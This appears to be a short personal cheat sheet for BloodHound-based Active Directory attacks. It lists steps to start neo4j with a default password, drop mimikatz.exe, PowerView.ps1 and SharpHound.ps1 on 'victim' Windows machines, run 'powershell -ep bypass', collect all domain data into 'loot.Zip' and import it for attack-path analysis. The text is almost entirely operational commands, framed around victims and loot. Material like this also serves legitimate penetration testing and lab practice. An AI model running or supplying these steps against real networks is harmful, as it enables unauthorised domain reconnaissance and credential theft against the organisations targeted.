# Bloodhound

First Start ------>>>>> ```neo4j console```
Open it in browser ------>>>>> ```http://localhost:7474/```
Login with ------>>>>> ```neo4j/123456 Default pass is neo4j/neo4j```
Open ------>>>>> ```bloodhound in terminal```
Login ------>>>>> ```user/pass```


# Connect with victim windows systems and put these 3 files. 
1). mimikatz.exe
2). powerView.ps1
3). SharpHound.ps1


# Use these cmds in victim systems. 
1). powershell -ep bypass
2). ..\SharpHound.ps1
3). Invoke-Bloodhound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip


# Take loot.Zip file to import bloodhound in our systems
1). import graph ---->>> uploaded file here
2). Check it and enjoy it.

